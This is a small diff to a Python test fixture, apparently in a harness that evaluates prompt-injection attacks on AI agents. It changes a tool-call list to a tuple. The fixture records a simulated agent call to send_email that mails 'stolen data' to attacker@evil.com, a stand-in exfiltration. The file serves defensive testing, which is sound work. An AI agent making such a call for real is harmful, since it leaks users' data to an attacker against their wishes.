@@ -48,9 +48,7 @@ def sample_attack_result(sample_payload_instance: PayloadInstance) -> AttackResu
     return AttackResult(
         payload_instance=sample_payload_instance,
         raw_output="CANARY-abc123",
-        tool_calls=[
-            ToolCall(tool_name="send_email", arguments={"to": "attacker@evil.com", "body": "stolen data"}),
-        ],
+        tool_calls=(ToolCall(tool_name="send_email", arguments={"to": "attacker@evil.com", "body": "stolen data"}),),
     )
 
 
